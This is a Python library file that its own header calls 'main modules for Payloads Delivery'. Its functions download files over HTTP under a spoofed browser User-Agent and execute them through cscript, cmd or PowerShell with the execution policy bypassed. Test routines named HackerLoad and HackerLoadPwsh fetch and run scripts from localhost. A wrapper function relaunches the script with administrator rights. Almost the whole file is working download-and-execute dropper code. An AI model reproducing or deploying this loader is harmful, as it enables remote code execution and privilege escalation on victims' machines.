#!python
###
# LIB_FUNC.PY
# This file contain main modules for Payloads Delivery
#
# Revision 1.1.0.0 (Extended Beta) May be Present
# The Library Links at lib_func-1.0.0.js
# 
# Version 1.1.1.0 (Extended Beta) Build 0001
#
###

import tempfile
import os
import requests
import subprocess
import sys
import ctypes

###
# getTempEnviron()
#
# This Function Returns the Path for ZLOVRED Directory or Path for User Variable TEMP
#
# PARAMETERS:   NONE
# RETURNS:      Path for Zlovred Directory if Exists or
#               Path for User Variable %TEMP% if Success or
#		"" if General System Error
###

def getTempEnviron():
    path1 = "c:\\pub1\\Distrib\\Zlovred"
    path2 = tempfile.gettempdir()
    if os.path.isdir(path1):
        return path1
    else:
        if os.path.isdir(path2):
            return path2
        else:
            return ""

###
# UploadFilesFromInt( strFile, strURL, strPath )
# This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
# and Save it on Local Computer to Path strPath
#
# PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
#               strURL -- an URL of the web-site, from which the File
#               is Downloaded
#               strPath -- a Place in a Windows Computer (Full path without slash)
#               in which the File is Downloaded
#
# RETURNS:      0 -- If File is Normally Downloaded and Created
#               1 -- if File in Path strPath Can't Create
#               2 -- if XMLHTTP or ADOStream Can't Initialize
#				3 -- if Emty HTTP Responce or Send Access Denied
#				4 -- if HTTP Response Not 200 (while is not make)
#
###

def uploadFilesFromInt( strFile, strURL, strPath ):
    strFileURL = strURL + strFile
    strLocal_Path = strPath + "\\" + strFile
    intUploadFilesFromInt = 0
    blnExistRemoteFile = True
    if os.path.isdir(strPath):
        intUploadFilesFromInt = 0
    else:
        intUploadFilesFromInt = 1
        print("\nWrong Path: " + strPath)
    aUserAgentHeader = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'}
    try:
        r = requests.get(strFileURL, headers=aUserAgentHeader)
    except requests.ConnectionError:
        print("\nCan't open URL: " + strFileURL +"\nConnection Error")
        return 3
    except requests.ConnectTimeout:
        print("\nCan't open URL: " + strFileURL +"\nConnection Timeout")
        return 3
    if r.status_code == 200 and intUploadFilesFromInt == 0:
        blnExistRemoteFile = True
    else:
        blnExistRemoteFile = False
        intUploadFilesFromInt = 4
        print("\nWrong HTTP Status: " + str(r.status_code) + "\nURL = " + strFileURL )
    if blnExistRemoteFile:
        try:
            with open(strLocal_Path, 'wb') as fstream:
                fstream.write(r.content)
        except OSError:
            print("\nCan't open/write file:" + strLocal_Path)
            intUploadFilesFromInt = 1
        if not(os.path.isfile(strLocal_Path) and intUploadFilesFromInt == 0):
            intUploadFilesFromInt = 1
    return intUploadFilesFromInt

#******************************************************************************
#
# runDownloadedScript01( strPath, strVBS )
# This Function Run Visible a strVBS File
# with Command "cscript //NoLogo " & strPath & "\" & strVBS
#
# PARAMETERS:   strPath -- The Path to strVBS
#               strVBS -- a VBS File with instructions
#               (Windows Scripts Shell)
#
# RETURNS:      0 if Success
#				1 if Path not Found
#
#*****************************************************************************/
def runDownloadedScript01(strPath, strVBS):
    # Define Windows Scripts Options
    constRun_VBS = " //Nologo "
    #  Define VBS Script Options (Empty)
    constOpt = "";
    pathCMD = os.environ['SystemRoot'] + "\\System32"
    cscriptEXE = pathCMD + "\\cscript.exe"
    strLocal_Path = strPath + "\\" + strVBS
    if not os.path.isfile(cscriptEXE):
        return 1
    if not os.path.isfile(strLocal_Path):
        return 1
    strValue = cscriptEXE + constRun_VBS + "\"" + strLocal_Path + "\"" + constOpt
    result = subprocess.run(strValue, capture_output=True, encoding='cp866', shell=True)
    print(result.stdout)
    print("\nError Code: ", result.returncode)
    return 0

#******************************************************************************
#
# runDownloadedCmd01( strPath, strCmd )
# This Function Run Visible a strCmd File
# with Command "cmd /c " & "\"" & strPath & "\" & strCmd & "\""
#
# PARAMETERS:   strPath -- The Path to strVBS
#               strCmd -- a Cmd File with instructions
#               (Windows Command Shell)
#
# RETURNS:      0 if Success
#				1 if Path not Found
#
#*****************************************************************************/
def runDownloadedCmd01(strPath, strCmd):
    # Define Windows Scripts Options
    constRun_Cmd = " /c "
    #  Define VBS Script Options (Empty)
    constOpt = "";
    pathCMD = os.environ['SystemRoot'] + "\\System32"
    startCmd = "cmd.exe"
    cmdEXE = pathCMD + "\\" + startCmd
    strLocal_Path = strPath + "\\" + strCmd
    if not os.path.isfile(cmdEXE):
        return 1
    if not os.path.isfile(strLocal_Path):
        return 1
    strValue = cmdEXE + constRun_Cmd + "\"" + strLocal_Path +"\"" + constOpt
    # print(strValue)
    result = subprocess.run(strValue, capture_output=True, encoding='cp866', shell=True)
    print(result.stdout)
    print("\nError Code: ", result.returncode)
    return 0

#******************************************************************************
#
# runDownloadedPwsh01( strPath, strPwsh )
# This Function Run Visible a strPwsh File
# with Command "powershell -File " & strPath & "\" & strPwsh
#
# PARAMETERS:   strPath -- The Path to strVBS
#               strPwsh -- a Powershell Scripr with instructions
#               (Windows PowerShell 5.1)
#
# RETURNS:      0 if Success
#				1 if Path not Found
#
#*****************************************************************************/
def runDownloadedPwsh01(strPath, strPwsh):
    # Define Windows Scripts Options
    constRun_Pwsh = " -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -File "
    #  Define VBS Script Options (Empty)
    constOpt = "";
    pathCMD = os.environ['SystemRoot'] + "\\System32"
    pwshPath = pathCMD + "\\WindowsPowerShell\\v1.0"
    startCmd = "powershell.exe"
    cmdEXE = pwshPath + "\\" + startCmd
    strLocal_Path = strPath + "\\" + strPwsh
    if not os.path.isfile(cmdEXE):
        return 1
    if not os.path.isfile(strLocal_Path):
        return 1
    strValue = cmdEXE + constRun_Pwsh + "\"" + strLocal_Path +"\"" + constOpt
    # print(strValue)
    result = subprocess.run(strValue, capture_output=True, encoding='cp866', shell=True)
    print(result.stdout)
    print("\nError Code: ", result.returncode)
    return 0

#* ********************************************************
#
# scriptDownlRun01( strURL , strFileNameWSH, iTimeOut )
#
# This Script Downloads VBS file from strURL Path and
# Execute it 
#
# PARAMETERS:	strURL an URL Path to Download
# 				strFileNameWSH - Name of WSH File
# RETURNS:		0 if Success Download and Run
#				1 if Error Occur
#
# *********************************************************/
def scriptDownlRun01(strURL, strFileNameWSH):
    # Get Temp Folder Name
    tempFolder = getTempEnviron()
    # Check if strFolder is Empty of TEMP Directory not Assigned
    if tempFolder =="":
        return 1
    iFlag = uploadFilesFromInt(strFileNameWSH, strURL, tempFolder)
    if iFlag : 
        return 1
    iFlag = runDownloadedScript01(tempFolder, strFileNameWSH)
    if iFlag :
        return 1
    return 0


#* ********************************************************
#
# cmdDownlRun01( strURL , strCmd )
#
# This Script Downloads Cmd file from strURL Path and
# Execute it 
#
# PARAMETERS:	strURL an URL Path to Download
# 				strCmd - Name of Cmd File
# RETURNS:		0 if Success Download and Run
#				1 if Error Occur
#
# *********************************************************/
def cmdDownlRun01(strURL, strCmd):
    # Get Temp Folder Name
    tempFolder = getTempEnviron()
    # Check if strFolder is Empty of TEMP Directory not Assigned
    if tempFolder =="":
        return 1
    iFlag = uploadFilesFromInt(strCmd, strURL, tempFolder)
    if iFlag : 
        return 1
    iFlag = runDownloadedCmd01(tempFolder, strCmd)
    if iFlag :
        return 1
    return 0


### Tests

# print("Tempdir = " + getTempEnviron())

###
# HackerLoad
# A Function for Downloading an Executing Payload
# (most Common for Test)
#
# PARAMETERS: NONE
# RETURNS: Always 0
#
###
def HackerLoad():
#    aFolder = os.getcwd()
#    aFolder = "C:"
#    aFolder = os.path.dirname(os.path.abspath(__file__))
#    aFolder = getTempEnviron()
    anURL = "http://localhost/"
#    aFile = "echo.bat"
#    print( "\niFlag=" + str(cmdDownlRun01( anURL, aFile)))
    aFile = "echo.wsf"
    print( "\niFlag=" + str(scriptDownlRun01( anURL, aFile)))

###
# HackerLoadPwsh
# A Function for an Executing Payload
# (most Common for Test)
#
# PARAMETERS: NONE
# RETURNS: Always 0
#
###
def HackerLoadPwsh():
#    aFolder = os.getcwd()
    aFolder = os.path.expanduser(os.getenv('USERPROFILE'))
#    aFolder = os.path.dirname(os.path.abspath(__file__))
#    aFolder = getTempEnviron()
#    anURL = "http://localhost/"
#    aFile = "echo.bat"
#    print( "\niFlag=" + str(cmdDownlRun01( anURL, aFile)))
    aFile = "echo.ps1"
    print( "\niFlag=" + str(runDownloadedPwsh01( aFolder, aFile)))

# HackerLoadPwsh()

###
#
# wrapper
# A Function will Check if it is Run with Elevated Privileges
# and will Run with these Privileges at a New Window if not
# (most Common for Test)
#
# PARAMETERS: NONE
# RETURNS: Always 0
#
###
def wrapper():
    validation = ctypes.windll.shell32.IsUserAnAdmin()
    if validation == 1:
        return HackerLoad()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    return wrapper

# wrapper()